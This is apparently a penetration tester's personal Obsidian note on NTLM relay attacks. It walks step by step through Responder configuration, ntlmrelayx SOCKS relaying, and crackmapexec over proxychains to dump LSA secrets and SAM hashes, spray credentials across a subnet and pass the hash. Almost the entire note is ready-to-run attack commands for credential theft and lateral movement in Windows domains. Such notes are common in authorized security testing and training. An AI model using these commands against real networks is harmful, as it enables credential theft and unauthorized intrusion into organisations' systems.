---
creation date: September 8th 2022
last modified date: September 8th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[ntlmrelayx.py]]  
___

## Socks Proxy Relaying

Configure Responder with `SMB` and `HTTP` turned off in `/etc/responder/Responder.conf`

``````
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On 
Kerberos = On
FTP = On 
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On  
LDAP = On
``````

````
sudo responder -I eth0 -w
````


Make sure /etc/proxychains.conf is configured to use port 1080


``````

sudo python3 ntlmrelayx.py -tf ~/Desktop/targets -socks -smb2support

``````

^a8df20

type `socks` into our relay prompt to see the active connections available.

Look for a connection that has AdminStatus set to true.

Use proxychains with crackmapexec to use these sessions. The password we provide is arbitrary since the SOCKS proxy is going to use the session we gained from relaying auth previously. The IP and user should come from the output of running socks in ntlmrelayx.py.

`proxychains cme smb 10.1.1.206 -u user -p pass -d Domain --lsa

Using the --lsa will dump hashes and clear text passwords from registry secrets. Using --sam will obtain local account hashes.

Validate any clear text passwords or hashes that were cracked work using crackmapexec. 

`proxychains cme smb 10.1.1.1/24 -u user -p pass -d Domain


You can also passthehash with crackmapexec.


`proxychains cme smb 10.1.1.1/24 -u user -H hashgoeshere -d Domain


You can use bloodhound to see if those accounts have local admin on any other machine and dump lsa and sam from them. 

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 8th 2022 (10:12 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
